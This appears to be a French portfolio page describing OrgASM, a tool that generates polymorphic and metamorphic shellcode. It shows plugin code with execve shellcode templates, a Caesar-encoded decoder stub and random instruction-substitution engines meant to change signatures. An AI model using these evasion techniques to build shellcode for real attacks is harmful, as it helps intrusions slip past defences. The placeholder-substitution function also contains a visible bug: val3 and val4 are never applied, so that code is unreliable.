# Sécurité offensive

## OrgASM

![OrgASM Welcome](/assets/offsec/orgasm/media/welcome.png)

!!! info

	+ Source : [https://gitlab.com/Alvoras/orgasm](https://gitlab.com/Alvoras/orgasm)
	+ Langage : Python, C, NASM

### Description

OrgASM est un outil en ligne de commande interactif qui permet de générer des shellcodes poly- et metamorphique.

Il propose également une gamme d'outils facilitant le développement, le test et le débug de shellcode.

!!! note
	Le plugin de payload supporte à la fois le code source NASM et les shellcode sous leurs formes hexadécimale.

	En revanche, le moteur en charge du métamorphisme ne supporte que la première forme.

### Aperçu

<center>
	<video alt="OrgASM Demo" width="100%" controls>
	  <source src="/assets/offsec/orgasm/media/demo.webm" type="video/webm">
	Your browser does not support the video tag.
	</video>
</center>


### Fonctionnement

La fondation du fonctionnement de cet outil est le découpage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de manière indépendante.

Nous retrouvons ainsi un système de plugin différent pour :

+ Le payload
+ La données à insérer dynamiquement
+ Le polymorphisme
+ Le metamorphisme

#### Payload

La création d'un plugin de payload se résume à renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de métamorphismes utilisés.

```python
from modules.payload.base import BasePayload
from modules.patcher.ascii_data import AsciiData
from modules.patcher.ascii_len import AsciiLen

from modules.meta.metaengine import MetaEngine
from modules.meta.junk import Junk
from modules.meta.zero import Zero


class ExecvePayload(BasePayload):
    def __init__(self, state):
        super().__init__(state)
        self.name = "Execve"

        # Add the patcher's options to the payload
        # Here the AsciiData adds the "data" option
        self.options.add_patcher_options(AsciiData)
        self.add_patcher(AsciiData)

    def payload_32(self):
    	# Register the metmorphic plugins used
        meta = MetaEngine()
        meta.add(Junk)
        meta.add(Zero)

        return fr"""
global _start:

_start:
	; Pick a random alterations and patch it on the fly
    {meta.apply('zero', 32, reg1='eax')}
    push eax
    ; Insert the placeholder that will be replaced by the value of the "data" option
    {AsciiData.token}
    ; Add some random junk
    {meta.apply('junk', 32)}
    mov ebx,esp
    mov ecx,eax
    mov edx,eax
    mov al, 0x0b
    mov ebx, esp
    int 0x80
    {meta.apply('zero', 32, reg1='eax')}
    inc eax
    int 0x80
"""

	# The same goes for the x64 template
    def payload_64(self):
        meta = MetaEngine()
        meta.add(Junk)
        meta.add(Zero)

        return fr"""
global _start:

_start:
    {meta.apply('zero', 64, reg1='eax')}
    push   0x42
    pop    rax
    inc    ah
    cqo
    push   rdx
    {AsciiData.token}
    {meta.apply('junk', 64)}
    push   rsp
    pop    rsi
    mov    r8, rdx
    mov    r10, rdx
    syscall
"""
```

#### Données dynamiques

Les données à intégrer au shellcode de manière dynamique sont gérées par les `patchers`.

Leur fonctionnement est simple : leur seul rôle est renvoyer la donnée par laquelle remplacer le placeholder présent dans le template.

```python
from modules.patcher.base import BasePatcher


class AsciiLen(BasePatcher):
	# Template placeholder
    token = "$ASCII_LEN$"

    # "patch_shellcode" is set upstream to signal
    # that we're patching either raw shellcode or NASM source code
    def __init__(self, sc, patch_shellcode):
        super().__init__(sc, patch_shellcode)

    def apply(self, options, encoded_payload):
        data = format(len(options.get("data")), "02x")  # ex : 1a

        # We need to add an "h" to the end of the hex string if we're
        # patching a source code template
        # ie. 08h
        return self.patch_with(data) if self.patch_shellcode
        	else self.patch_with(f"{data}h")

```

#### Polymorphisme

Le polymorphisme est pris en charge par les `encoders`. 

Analogues aux payloads, il est également possible d'intégrer des instructions métamorphiques au sein du template.

Après avoir été encodé via la fonction `encode_byte`, le payload est placé à la suite du décodeur.

```python
from modules.encoder.base import BaseEncoder
from modules.meta.metaengine import MetaEngine
from modules.meta.zero import Zero
from modules.meta.junk import Junk
from modules.patcher.shellcode_len import ShellcodeLen
from modules.patcher.offset import Offset


class CaesarMetaEncoder(BaseEncoder):
    def __init__(self, state):
        super().__init__(state)
        self.name = "Caesar metamorphic"
        self.options.add_patcher_options(Offset)

        self.add_patcher(Offset)
        self.add_patcher(ShellcodeLen)

    def decoder_32(self):
        meta = MetaEngine()
        meta.add(Junk)
        meta.add(Zero)

        return rf"""
section .text

global _start:

_start:
   jmp    one
   {meta.apply('junk', 32)}

four:
   pop    esi
   {meta.apply('zero', 32, reg1='ecx')}
   mov    cl,{ShellcodeLen.token}

two:
   sub    BYTE [esi+ecx-1],{Offset.token}
   sub    cl,1
   jne    two
   jmp    three

one:
   call   four

three:
"""

    def decoder_64(self):
        return rf"""
section .text

global _start:

_start:
   jmp    one

four:
   pop    rsi
   xor    rcx, rcx
   mov    cl,{ShellcodeLen.token}

two:
   sub    BYTE [rsi+rcx-1],{Offset.token}
   sub    cl,0x1
   jne    two
   jmp    three

one:
   call   four

three:
"""

    def encode_byte(self, op):
        encoded = format(op + self.options.get("offset") % 26, "02x")
        encoded_hex = int(encoded[-2:], 16)
        return encoded_hex

    def decode_byte(self, op):
        decoded = format(op - self.options.get("offset") % 26, "02x")
        decoded_hex = int(decoded[-2:], 16)
        return decoded_hex

```

Les fonctions d'encodage et de décodage peuvent également être utilisées depuis l'interface sur un shellcode brute :

<center>
	<video alt="OrgASM Demo" width="100%" controls>
	  <source src="/assets/offsec/orgasm/media/encode_decode.webm" type="video/webm">
	Your browser does not support the video tag.
	</video>
</center>


#### Metamorphisme

Les plugins servant à implémenter le metamorphisme se résument à un nom et aux templates des altérations possibles :

```python
from modules.meta.base import BasePlugin


class Zero(BasePlugin):
    def __init__(self):
        super().__init__()
        self.name = "zero"
        self.alterations = {
            "32": [
                [f"xor <reg1>, <reg1>"],
                [f"mov <reg1>, 0"],
                [f"sub <reg1>, <reg1>"],
            ],
            "64": [
                [f"xor <reg1>, <reg1>"],
                [f"mov <reg1>, 0"],
                [f"sub <reg1>, <reg1>"],
            ]
        }

```

Le moteur de métamorphisme, quant à lui, se contente de tenir la liste des plugins enregistrés et de les appeler en passant les valeurs depuis le template :

```python
import re
import random

from lib.exception import MarkerNotFound


class MetaEngine:

    def __init__(self):
        self.name = "base"
        self.alterations = {}
        self.plugins = {}

    def add(self, plugin):
        eng = plugin()
        self.plugins[eng.name] = eng

    def apply(self, name, arch, **kwargs):
        if not (plugin := self.plugins.get(name)):
            print(f"Metamorphic plugin not found \"{name}\"")
            return ""

        return plugin.get_random_alt(
            arch,
            reg1=kwargs.get("reg1"),
            reg2=kwargs.get("reg2"),
            val1=kwargs.get("val1"),
            val2=kwargs.get("val2"),
            val3=kwargs.get("val3"),
            val4=kwargs.get("val4")
        )

```

La fonction `get_random_alt` du plugin prend ensuite le relais et s'occupe de générer la ou les instructions à partir du template reçu :

```python
import random

from lib.exception import UnsupportedArch


class BasePlugin:
    def __init__(self):
        self.alterations = {}

    def get_random_alt(
            self,
            arch,
            reg1="",
            reg2="",
            val1="",
            val2="",
            val3="",
            val4=""
    ):
        alterations = self.alterations.get(str(arch))

        if not alterations:
            raise UnsupportedArch

        rng = random.randint(0, len(alterations)-1)
        alt = alterations[rng]

        for idx, line in enumerate(alt):
            line = line.replace("<reg1>", str(reg1))
            line = line.replace("<reg2>", str(reg2))
            line = line.replace("<val1>", str(val1))
            line = line.replace("<val2>", str(val2))
            line = line.replace("<val2>", str(val3))
            line = line.replace("<val2>", str(val4))
            alt[idx] = line

        return "\n".join(alt)

```

Ces altérations sont choisies aléatoirement à chaque fois que le shellcode est généré. 

Il est possible, grâce à l'option `no_badchars`, de recommencer la génération jusqu'à ne plus détecté de de badchars présent (dans la limite de la valeur définie via l'option `badchars_max_loop`).

### Confort

Pour améliorer le confort lors de la création, de l'utilisation et du test de shellcode, OrgASM propose une vue détaillée reprenant un certain nombre d'informations pouvant s'avérer être utiles, telles que :

+ La taille du shellcode
+ Les badchars potentiellement présents
+ La liste classée par ordre alphabétique des octets qui le composent, sans doublons
+ Les hashs MD5, SHA1 et SHA256

![OrgASM Details](/assets/offsec/orgasm/media/details_options_run.png)

Lorsque l'option verbose est activée, le programme détaille les processus de compilation et d'exécution pour permettre de les reproduire dans un autre contexte.

![OrgASM Verbose Run](/assets/offsec/orgasm/media/run_verbose.png)
